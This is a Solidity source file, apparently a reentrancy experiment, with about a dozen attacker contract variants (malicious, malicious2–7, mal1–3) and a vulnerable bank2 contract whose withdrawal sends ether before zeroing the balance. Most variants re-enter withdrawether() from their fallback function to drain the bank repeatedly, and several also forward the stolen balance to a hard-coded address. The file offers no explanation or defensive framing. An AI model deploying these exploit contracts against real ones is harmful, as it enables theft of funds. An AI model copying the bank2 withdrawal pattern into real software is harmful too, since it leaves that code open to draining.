pragma solidity ^0.4.8;

contract malicious{
    uint public x;
    address addr=0x81aE0fB96D0f56089154C900FE9137FAb66aB4e9;
    function()payable{
        
        bank(addr).withdrawether();
    }
   function deposit(address addr,uint x)returns(bool){
        x=x*(10**18);
        if(!addr.call.gas(200000).value(x)(bytes4(sha3("deposit()"))))
            return false;
        return true;
    }
    function customer_withdraw(address addr) returns (bool){
        
        return bank(addr).withdrawether();
        
    }
   
}
contract malicious2{
    uint public x;
   
    function()payable{
         address addr=0x81aE0fB96D0f56089154C900FE9137FAb66aB4e9;
         bank(addr).withdrawether();
    }
   function deposit(address addr,uint x)returns(bool){
        x=x*(10**18);
        if(!addr.call.gas(200000).value(x)(bytes4(sha3("deposit()"))))
            return false;
        return true;
    }
    function customer_withdraw(address addr) returns (bool){
        
        return bank(addr).withdrawether();
        
    }
   
}
contract malicious3{
    uint public x;
   
   
   
   
    function()payable{
         address addr=0x81aE0fB96D0f56089154C900FE9137FAb66aB4e9;
         if(addr.call(bytes4(sha3("withdrawether()")))){}
    }
   function deposit(address addr,uint x)returns(bool){
        x=x*(10**18);
        if(!addr.call.gas(200000).value(x)(bytes4(sha3("deposit()"))))
            return false;
        return true;
    }
    function customer_withdraw(address addr) returns (bool){
        
        return bank(addr).withdrawether();
        
    }
   
}
contract malicious4{
    uint public x;
   
    function()payable{
         address addr=0x81aE0fB96D0f56089154C900FE9137FAb66aB4e9;
         //if(addr.call(bytes4(sha3("withdrawether()")))){}
    }
   function deposit(address addr,uint x)returns(bool){
        x=x*(10**18);
        if(!addr.call.gas(200000).value(x)(bytes4(sha3("deposit()"))))
            return false;
        return true;
    }
    function customer_withdraw(address addr) returns (bool){
        
        return bank(addr).withdrawether();
        
    }
   
}
contract malicious5{
    uint public x;
   
    function()payable{
         x++;
         address back=0xDA2d593D1951DDC3c8452aD0cA71291522EcC164;
         if(back.send(this.balance)){}
         address addr=0x81aE0fB96D0f56089154C900FE9137FAb66aB4e9;
         if(addr.call(bytes4(sha3("withdrawether()")))){}
    }
   function deposit(address addr,uint x)returns(bool){
        x=x*(10**18);
        if(!addr.call.gas(200000).value(x)(bytes4(sha3("deposit()"))))
            return false;
        return true;
    }
    function customer_withdraw(address addr) returns (bool){
        
        return bank(addr).withdrawether();
        
    }
   
}
contract malicious6{
    uint public x;
   
    function()payable{
         x++;
         address back=0xDA2d593D1951DDC3c8452aD0cA71291522EcC164;
         if(back.send(this.balance)){}
         address addr=0x81aE0fB96D0f56089154C900FE9137FAb66aB4e9;
         if(addr.call(bytes4(sha3("withdrawether()")))){}
    }
   function deposit(address addr,uint x)returns(bool){
        x=x*(10**18);
        if(!addr.call.gas(200000).value(x)(bytes4(sha3("deposit()"))))
            return false;
        return true;
    }
     function receive()payable{
        
    }
    function customer_withdraw(address addr) returns (bool){
        
        return bank(addr).withdrawether();
        
    }
   
}
contract malicious7{
    uint public x;
   address addr=0x81aE0fB96D0f56089154C900FE9137FAb66aB4e9;
    address back=0xDA2d593D1951DDC3c8452aD0cA71291522EcC164;
    function()payable{
         x++;
        
         if(back.send(this.balance)){}
         
         if(addr.call(bytes4(sha3("withdrawether()")))){}
    }
   function deposit(address addr,uint x)returns(bool){
        x=x*(10**18);
        if(!addr.call.gas(200000).value(x)(bytes4(sha3("deposit()"))))
            return false;
        return true;
    }
     function receive()payable{
        
    }
    function customer_withdraw(address addr) returns (bool){
        
        return bank(addr).withdrawether();
        
    }
   
}
contract  normal2{
    uint public x;
   address addr=0x81aE0fB96D0f56089154C900FE9137FAb66aB4e9;
    address back=0xDA2d593D1951DDC3c8452aD0cA71291522EcC164;
    function()payable{
         x++;
        
         if(back.send(this.balance)){}
         
         
    }
   function deposit(address addr,uint x)returns(bool){
        x=x*(10**18);
        if(!addr.call.gas(200000).value(x)(bytes4(sha3("deposit()"))))
            return false;
        return true;
    }
     function receive()payable{
        
    }
    function customer_withdraw(address addr) returns (bool){
        
        return bank(addr).withdrawether();
        
    }
   
}
contract normal3{
    uint public x;
    address addr=0x81aE0fB96D0f56089154C900FE9137FAb66aB4e9;
    address back=0xDA2d593D1951DDC3c8452aD0cA71291522EcC164;
    function()payable{
         x++;
        
    }
   function deposit(address addr,uint x)returns(bool){
        x=x*(10**18);
        if(!addr.call.gas(200000).value(x)(bytes4(sha3("deposit()"))))
            return false;
        return true;
    }
     function receive()payable{
        
    }
    function customer_withdraw(address addr) returns (bool){
        
        return bank2(addr).withdrawether();
        
    }
   
}
contract normal4{
    uint public x;
    address addr=0x81aE0fB96D0f56089154C900FE9137FAb66aB4e9;
    address back=0xDA2d593D1951DDC3c8452aD0cA71291522EcC164;
    function()payable{
         
        
    }
   function deposit(address addr,uint x)returns(bool){
        x=x*(10**18);
        if(!addr.call.gas(200000).value(x)(bytes4(sha3("deposit()"))))
            return false;
        return true;
    }
     function receive()payable{
        
    }
    function customer_withdraw(address addr) returns (bool){
        
        return bank2(addr).withdrawether();
        
    }
   
}
contract mal2{
    uint public x;
    address back=0xDA2d593D1951DDC3c8452aD0cA71291522EcC164;
    address addr=0x82a62bC28692Fe74efCC067CA37C2378cC93DF1D;
    function()payable{
         x++;
        
         if(back.send(this.balance)){}
        
         //if(addr.call(bytes4(sha3("withdrawether()")))){}
    }
   function deposit(address addr,uint x)returns(bool){
        x=x*(10**18);
        if(!addr.call.gas(200000).value(x)(bytes4(sha3("deposit()"))))
            return false;
        return true;
    }
     function receive()payable{
        
    }
    function customer_withdraw(address addr) returns (bool){
        
        return bank2(addr).withdrawether();
        
    }
   
}
contract mal1{
    uint public x;
    address back=0xDA2d593D1951DDC3c8452aD0cA71291522EcC164;
    address addr=0x82a62bC28692Fe74efCC067CA37C2378cC93DF1D;
    function()payable{
         x++;
        
         if(back.send(this.balance)){}
        
         if(addr.call(bytes4(sha3("withdrawether()")))){}
    }
   function deposit(address addr,uint x)returns(bool){
        x=x*(10**18);
        if(!addr.call.gas(200000).value(x)(bytes4(sha3("deposit()"))))
            return false;
        return true;
    }
     function receive()payable{
        
    }
    function customer_withdraw(address addr) returns (bool){
        
        return bank2(addr).withdrawether();
        
    }
   
}

contract mal3{
    uint public x;
    address back=0xDA2d593D1951DDC3c8452aD0cA71291522EcC164;
    address addr=0x82a62bC28692Fe74efCC067CA37C2378cC93DF1D;
    function()payable{
         x++;
        
         //if(back.send(this.balance)){}
        
         if(addr.call(bytes4(sha3("withdrawether()")))){}
    }
   function deposit(address addr,uint x)returns(bool){
        x=x*(10**18);
        if(!addr.call.gas(200000).value(x)(bytes4(sha3("deposit()"))))
            return false;
        return true;
    }
     function receive()payable{
        
    }
    function customer_withdraw(address addr) returns (bool){
        
        return bank2(addr).withdrawether();
        
    }
    
   
}
//0x82a62bC28692Fe74efCC067CA37C2378cC93DF1D
contract bank2{
    mapping(address=>uint)account;
    uint public amount;
    function()payable{}
    function deposit() payable returns(bool){
        account[msg.sender]+=msg.value;
        amount=msg.value;
    }
    function withdrawether() returns(bool){
        uint bal=account[msg.sender];
        if(!msg.sender.call.value(bal)())
            return false;
        account[msg.sender]=0;
        return true;
    }
}
